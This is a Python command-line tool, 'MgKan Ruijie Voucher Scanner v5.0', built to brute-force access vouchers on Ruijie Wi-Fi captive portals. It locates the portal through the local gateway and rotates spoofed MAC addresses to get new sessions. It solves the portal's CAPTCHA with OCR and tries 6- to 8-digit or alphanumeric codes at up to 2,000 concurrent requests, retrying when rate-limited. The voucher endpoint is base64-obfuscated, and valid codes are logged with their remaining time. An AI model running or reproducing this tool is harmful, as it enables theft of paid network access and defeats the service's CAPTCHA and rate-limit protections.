#!/usr/bin/env python3
# MgKan.py - Ruijie Voucher Scanner
# Version: 5.0 - Clean Menu

import asyncio, aiohttp, json, base64, random, re, os, string, time, socket
import cv2
import ddddocr
import numpy as np
import urllib3
import requests

# ─────────────────────────── Settings ───────────────────────────
CONCURRENCY  = 500
BATCH_SIZE   = 500
RESULT_FILE  = os.path.expanduser("~/scan_results.txt")
# ────────────────────────────────────────────────────────────────

_connector      = None
_voucher_sem    = None
_ocr            = ddddocr.DdddOcr(show_ad=False)
stop_flag       = False
found_codes     = []
limited_codes   = []
retry_total     = 0
scan_start_time = None

# ANSI colors
COLOR_RESET = "\033[0m"
BOLD        = "\033[1m"
DIM         = "\033[2m"
GREEN       = "\033[92m"
YELLOW      = "\033[93m"
RED         = "\033[91m"
BLUE        = "\033[94m"
CYAN        = "\033[96m"
MAGENTA     = "\033[95m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════ LOGO ════════════════════════════════

def show_logo():
    logo = f"""
{BOLD}{CYAN}
   ███╗   ███╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗
   ████╗ ████║██╔════╝ ██║ ██╔╝██╔══██╗████╗  ██║
   ██╔████╔██║██║  ███╗█████╔╝ ███████║██╔██╗ ██║
   ██║╚██╔╝██║██║   ██║██╔═██╗ ██╔══██║██║╚██╗██║
   ██║ ╚═╝ ██║╚██████╔╝██║  ██╗██║  ██║██║ ╚████║
   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{COLOR_RESET}
{BLUE}╔══════════════════════════════════════════════════════════════╗
║  {GREEN}Ruijie Voucher Scanner v5.0{BLUE}                              ║
║  {YELLOW}Admin : {MAGENTA}Telegram - @SuperMgKan{BLUE}                    ║
╚══════════════════════════════════════════════════════════════╝{COLOR_RESET}
"""
    print(logo)

# ═══════════════════════════ PORTAL CATCHER ════════════════════

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def fetch_portal():
    print(f"\n{BLUE}═══════════════════════════════════════{COLOR_RESET}")
    print(f"{CYAN}  Ruijie Auto-Portal Catcher{COLOR_RESET}")
    print(f"{BLUE}═══════════════════════════════════════{COLOR_RESET}\n")

    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
    gateways = list(dict.fromkeys(gateways))
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }

    portal_url = None

    for gw in gateways:
        target = f"http://{gw}"
        print(f"{CYAN}[*] Trying: {target}...{COLOR_RESET}")
        try:
            res = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
            
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
                break
            
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                break
                
        except requests.exceptions.RequestException:
            pass

    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        
        print(f"\n{GREEN}[✓] Portal URL captured!{COLOR_RESET}")
        print(f"{BLUE}─{COLOR_RESET}"*60)
        print(f"{api_url}{COLOR_RESET}")
        print(f"{BLUE}─{COLOR_RESET}"*60)
        
        b64_url = base64.b64encode(api_url.encode()).decode()
        print(f"\n{CYAN}[*] Base64:{COLOR_RESET} {GREEN}{b64_url}{COLOR_RESET}\n")
        return api_url
    else:
        print(f"\n{RED}[❌] Failed to capture portal URL{COLOR_RESET}")
        return None

# ═══════════════════════════ MENU ══════════════════════════════

def show_menu():
    print(f"\n{BOLD}{GREEN}═══════════════════════════════════════{COLOR_RESET}")
    print(f"{BOLD}{CYAN}  MAIN MENU{COLOR_RESET}")
    print(f"{BOLD}{GREEN}═══════════════════════════════════════{COLOR_RESET}")
    print(f"\n  {YELLOW}[1]{COLOR_RESET} Auto-Catch Portal URL")
    print(f"  {YELLOW}[2]{COLOR_RESET} Manual Enter Portal URL")
    print(f"  {YELLOW}[3]{COLOR_RESET} Scan Mode Selection")
    print(f"  {YELLOW}[4]{COLOR_RESET} Speed Selection")
    print(f"  {YELLOW}[5]{COLOR_RESET} START SCAN")
    print(f"  {YELLOW}[6]{COLOR_RESET} View Results")
    print(f"  {YELLOW}[7]{COLOR_RESET} Help")
    print(f"  {YELLOW}[0]{COLOR_RESET} Exit")
    print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")

# ═══════════════════════════ CODE GENERATORS ════════════════════

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

_alnum = string.ascii_lowercase + string.digits
_alpha = string.ascii_lowercase

def all_generator(length=6):
    return "".join(random.choice(_alnum) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(_alpha) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    while True:
        if mode == "8":
            yield digit_generator(8)
        elif mode == "ascii-lower":
            yield ascii_generator(6)
        elif mode == "all":
            yield all_generator(6)
        else:
            raise ValueError(f"Unknown mode: {mode}")

# ═══════════════════════════ NETWORK HELPERS ════════════════════

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0,255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

async def check_session_url(url):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:
            async with s.get(url, allow_redirects=True, headers=headers) as r:
                return "sessionId" in str(r.url)
    except:
        return False

# ═══════════════════════════ CAPTCHA ════════════════════════════

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur  = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return _ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

# ═══════════════════════════ BALANCE INFO ═══════════════════════

async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]

    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')

                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"

                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue

    return "Plan:Unknown | Time:Unknown"
# ═══════════════════════════ SAVE RESULT ════════════════════════

def save_result(code, info, kind="SUCCESS"):
    with open(RESULT_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{kind}] {code}  |  {info}\n")

# ═══════════════════════════ VOUCHER CHECK ══════════════════════

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    img      = await Captcha_Image(sess, session_id)
                    text     = await Captcha_Text(img)
                    if not text:
                        continue
                    verified = await Varify_Captcha(sess, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass

            if not auth_code or stop_flag:
                return

            payload = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,
            }
            headers = {
                "authority":       "portal-as.ruijienetworks.com",
                "accept":          "*/*",
                "content-type":    "application/json",
                "origin":          "https://portal-as.ruijienetworks.com",
                "user-agent":      "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return

        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        save_result(code, info, "SUCCESS CODE")
        print(f"\n{GREEN}[+] SUCCESS: {code} | {info}{COLOR_RESET}")

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        save_result(code, info, "LIMITED CODE")
        print(f"\n{YELLOW}[!] LIMITED: {code} | {info}{COLOR_RESET}")

# ═══════════════════════════ RUNNER ═════════════════════════════

async def run_bruteforce(mode, session_url, speed):
    global _voucher_sem, stop_flag, scan_start_time, _connector, CONCURRENCY

    CONCURRENCY = speed

    _connector      = aiohttp.TCPConnector(limit=CONCURRENCY + 100, ssl=False)
    _voucher_sem    = asyncio.Semaphore(CONCURRENCY)
    stop_flag       = False
    scan_start_time = time.monotonic()

    code_iter = iter_codes(mode)
    total     = 10 ** int(mode) if mode in ["6", "7"] else None
    checked   = 0

    show_logo()

    print(f"\n{'='*55}")
    print(f"  {BOLD}{GREEN}Ruijie Voucher Scanner{COLOR_RESET}")
    print(f"{'='*55}")
    print(f"  {BLUE}Mode{COLOR_RESET}        : {BOLD}{mode}{COLOR_RESET}")
    print(f"  {BLUE}Speed{COLOR_RESET}        : {BOLD}{CONCURRENCY}{COLOR_RESET}")
    print(f"  {BLUE}Results{COLOR_RESET}     : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"  {BLUE}Stop{COLOR_RESET}        : {BOLD}Ctrl+C{COLOR_RESET}")
    print(f"{'='*55}\n")

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start_time
            speed_display   = (checked / elapsed * 60) if elapsed > 0 else 0

            if total:
                pct = (checked / total) * 100
                print(f"\r{CYAN}🔍 Checked:{COLOR_RESET}{BOLD}{checked:,}{COLOR_RESET}/{DIM}{total:,}{COLOR_RESET} ({YELLOW}{pct:.1f}%{COLOR_RESET})  {BLUE}⚡{speed_display:,.0f}/min{COLOR_RESET}  {GREEN}✅{len(found_codes)}{COLOR_RESET}  {YELLOW}⚠️{len(limited_codes)}{COLOR_RESET}  {RED}🔁{retry_total}{COLOR_RESET}", end="", flush=True)
            else:
                print(f"\r{CYAN}🔍 Checked:{COLOR_RESET}{BOLD}{checked:,}{COLOR_RESET}  {BLUE}⚡{speed_display:,.0f}/min{COLOR_RESET}  {GREEN}✅{len(found_codes)}{COLOR_RESET}  {YELLOW}⚠️{len(limited_codes)}{COLOR_RESET}  {RED}🔁{retry_total}{COLOR_RESET}", end="", flush=True)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()

    elapsed = time.monotonic() - scan_start_time
    hh, rem = divmod(int(elapsed), 3600)
    mm, ss  = divmod(rem, 60)

    print(f"\n\n{'='*55}")
    print(f"  {BOLD}{GREEN}Scan Complete{COLOR_RESET}")
    print(f"  {BLUE}Time{COLOR_RESET}         : {BOLD}{hh}h {mm}m {ss}s{COLOR_RESET}")
    print(f"  {BLUE}Checked{COLOR_RESET}      : {BOLD}{checked:,}{COLOR_RESET}")
    print(f"  {BLUE}Found{COLOR_RESET}        : {BOLD}{GREEN}{len(found_codes)}{COLOR_RESET}")
    print(f"  {BLUE}Limited{COLOR_RESET}      : {BOLD}{YELLOW}{len(limited_codes)}{COLOR_RESET}")
    print(f"  {BLUE}Retries{COLOR_RESET}      : {BOLD}{RED}{retry_total}{COLOR_RESET}")
    print(f"  {BLUE}Results{COLOR_RESET}      : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"{'='*55}")

    if found_codes:
        print(f"\n{GREEN}✅ SUCCESS CODES:{COLOR_RESET}")
        for c in found_codes:
            print(f"   {GREEN}{c}{COLOR_RESET}")
    if limited_codes:
        print(f"\n{YELLOW}⚠️ LIMITED CODES:{COLOR_RESET}")
        for c in limited_codes:
            print(f"   {YELLOW}{c}{COLOR_RESET}")

    print(f"\n{BLUE}───────────────────────────────────────────{COLOR_RESET}")
    input(f"{CYAN}[*] Press Enter to continue...{COLOR_RESET}")

# ═══════════════════════════ MAIN ═══════════════════════════════

async def async_main():
    global CONCURRENCY
    
    show_logo()
    
    portal_url = None
    mode = "6"
    speed = 500
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{GREEN}➜{COLOR_RESET} Select: ").strip()
        
        if choice == "1":
            portal_url = fetch_portal()
            
        elif choice == "2":
            portal_url = input(f"\n{BOLD}{GREEN}➜{COLOR_RESET} Enter Portal URL: ").strip()
            while not portal_url:
                portal_url = input(f"{RED}❌ URL cannot be empty!{COLOR_RESET} Enter: ").strip()
            print(f"{GREEN}[✓] URL set{COLOR_RESET}")
            
        elif choice == "3":
            print(f"\n{CYAN}Mode Selection:{COLOR_RESET}")
            print(f"  {YELLOW}6{COLOR_RESET}  - 6 digit (000000-999999)")
            print(f"  {YELLOW}7{COLOR_RESET}  - 7 digit (0000000-9999999)")
            print(f"  {YELLOW}8{COLOR_RESET}  - 8 digit (00000000-99999999)")
            print(f"  {YELLOW}ascii-lower{COLOR_RESET}  - a-z (6 chars)")
            print(f"  {YELLOW}all{COLOR_RESET}  - a-z + 0-9 (6 chars)")
            mode = input(f"{BOLD}{GREEN}➜{COLOR_RESET} Select [default: 6]: ").strip() or "6"
            print(f"{GREEN}[✓] Mode set to: {mode}{COLOR_RESET}")
            
        elif choice == "4":
            print(f"\n{CYAN}Speed Selection:{COLOR_RESET}")
            print(f"  {YELLOW}500{COLOR_RESET}   - Default")
            print(f"  {YELLOW}800{COLOR_RESET}   - Medium")
            print(f"  {YELLOW}1000{COLOR_RESET}  - Fast")
            print(f"  {YELLOW}1500{COLOR_RESET}  - Very Fast")
            print(f"  {YELLOW}2000{COLOR_RESET}  - Max")
            speed_input = input(f"{BOLD}{GREEN}➜{COLOR_RESET} Select [default: 500]: ").strip()
            speed = int(speed_input) if speed_input.isdigit() else 500
            CONCURRENCY = speed
            print(f"{GREEN}[✓] Speed set to: {speed}{COLOR_RESET}")
            
        elif choice == "5":
            if not portal_url:
                print(f"{RED}❌ No portal URL set! Use Mode 1 or 2 first.{COLOR_RESET}")
                continue
            print(f"\n{BLUE}[*] Checking session URL...{COLOR_RESET}")
            if not await check_session_url(portal_url):
                print(f"{RED}❌ Invalid session URL{COLOR_RESET}")
                continue
            print(f"{GREEN}✅ Session URL valid{COLOR_RESET}")
            await run_bruteforce(mode, portal_url, speed)
            
        elif choice == "6":
            if os.path.exists(RESULT_FILE):
                print(f"\n{BLUE}═══════════════════════════════════════{COLOR_RESET}")
                print(f"{CYAN}  SCAN RESULTS{COLOR_RESET}")
                print(f"{BLUE}═══════════════════════════════════════{COLOR_RESET}\n")
                with open(RESULT_FILE, 'r') as f:
                    print(f.read())
                print(f"\n{BLUE}───────────────────────────────────────────{COLOR_RESET}")
                input(f"{CYAN}[*] Press Enter to continue...{COLOR_RESET}")
            else:
                print(f"{YELLOW}[!] No results found{COLOR_RESET}")
                
        elif choice == "7":
            print(f"""
{BLUE}═══════════════════════════════════════{COLOR_RESET}
{CYAN}  HELP - MgKan Scanner v5.0{COLOR_RESET}
{BLUE}═══════════════════════════════════════{COLOR_RESET}

{YELLOW}[1]{COLOR_RESET} Auto-Catch Portal URL
{YELLOW}[2]{COLOR_RESET} Manual Enter Portal URL
{YELLOW}[3]{COLOR_RESET} Scan Mode Selection
{YELLOW}[4]{COLOR_RESET} Speed Selection
{YELLOW}[5]{COLOR_RESET} START SCAN
{YELLOW}[6]{COLOR_RESET} View Results
{YELLOW}[0]{COLOR_RESET} Exit
{BLUE}───────────────────────────────────────────{COLOR_RESET}
{RED}⚠️  Use responsibly!{COLOR_RESET}
""")
            print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")
            input(f"{CYAN}[*] Press Enter to continue...{COLOR_RESET}")
            
        elif choice == "0":
            print(f"\n{RED}[!] Exiting...{COLOR_RESET}")
            break
        else:
            print(f"{RED}❌ Invalid choice{COLOR_RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user{COLOR_RESET}")
